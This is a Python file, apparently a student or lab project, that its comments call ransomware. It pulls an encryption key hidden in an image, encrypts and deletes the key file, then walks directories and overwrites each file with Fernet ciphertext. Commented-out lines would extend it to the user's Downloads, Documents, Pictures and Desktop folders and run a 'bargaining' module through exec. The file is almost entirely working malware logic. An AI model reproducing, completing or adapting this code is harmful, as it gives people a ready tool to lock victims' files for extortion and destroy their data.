'''#import os
#from cryptography.fernet import Fernet
#from extract import extract_file


def encrypt_file(filename: str, key: str):
    """
    Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
    :param filename: Represents the file to undergo encryption
    :param key: Represents an instance of the Fernet Class created with a key.
    :return: None
    """
    # Converts that key to a Fernet object to gain access to Fernet methods
    f_key: Fernet = Fernet(key)
    # Assigns the data inside the unencrypted file to a variable
    with open(filename, "rb") as unencrypted_file:
        plaintext = unencrypted_file.read()
    # Encrypts the unencrypted data using the key and assigns the encrypted data to a variable
    ciphertext = f_key.encrypt(plaintext)
    # Overwrites the same file
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)


def process_directory(directory: str, key: str, blacklist: list[str]):
    """
    This function processes each directory, encrypting files that are not in the blacklist.
    :param directory: Represents the path to a directory that will have its files encrypted.
    :param key: Represents an instance of the Fernet Class created with a key.
    :param blacklist: Represents the directories that we don't want to encrypt
    :return: None
    """
    print(f"Traversing directory {directory}")
    # Unpacks the provided directory as a 3-tuple consisting of the root directory path, subdirectory names,
    # and file names
    if directory in blacklist:
        print("You're attempting to encrypt a blacklisted folder!")
        return
    for root, dir, files in os.walk(directory):
        # Ensures that the program doesn't accidentally encrypt itself!
        for directory in blacklist:
            if directory in dir:
                dir.remove(directory)
        # Iterates through each file in the directory
        for file in files:
            if file not in blacklist:
                # Combines the path of the directory with the file name to create filepath of file
                file_path = os.path.join(root, file)
                # Encrypts the file given the newly generated filepath
                encrypt_file(file_path, key)
                print(file)


def main():
    # Extracts the key from a specified image
    with open("passphrase.txt", "r") as file:
        lines = file.readlines()
        passphrase = lines[0].strip("\n")

    with open("images.txt", "r") as file:
        lines = file.readlines()
        image_containing_key: str = lines[0].strip("\n")
        image_containing_bargaining_code: str = lines[2].strip("\n")

    try:
        key_found: bool = os.path.exists(image_containing_key)
        bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
        if key_found and bargain_code_found:
            #code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
            key: str = extract_file(image_containing_key, passphrase)

            # Encrypts and removes the key from the working directory to hide from sight
            encrypt_file("key.txt", key)
            os.remove("key.txt")
        else:
            if not key_found and not bargain_code_found:
                filler = f"{image_containing_key} and {image_containing_bargaining_code} don't"
            elif not key_found:
                filler = f"{image_containing_key} doesn't"
            else:
                filler = f"{image_containing_bargaining_code} doesn't"
            raise FileNotFoundError(f"The image name/path {filler} exist in the current directory."
                                    f"Either the name fed to the variable in the code to be updated or the image "
                                    f"specified just doesn't exist.")
    except FileNotFoundError as fnfe:
        print(f"File Not Found: {fnfe}")
        return
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return

    # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
    # of the ransomware.
    blacklist: list[str] = ["New folder"]

    # Directories to encrypt in their entirety
    # TODO: Update as needed for testing purposes
    directories_to_encrypt = [
        "Shark Images"
        # os.path.expanduser("~/Downloads"),
        # os.path.expanduser("~/Documents"),
        # os.path.expanduser("~/Pictures"),
        # os.path.expanduser("~/Desktop")
    ]

    for directory in directories_to_encrypt:
        process_directory(directory, key, blacklist)

    print("Encryption successful!")

    # Runs the bargaining application
    #exec("import bargain_with_user")
    #exec(f"{code_to_bargain_with_user}")


main()

'''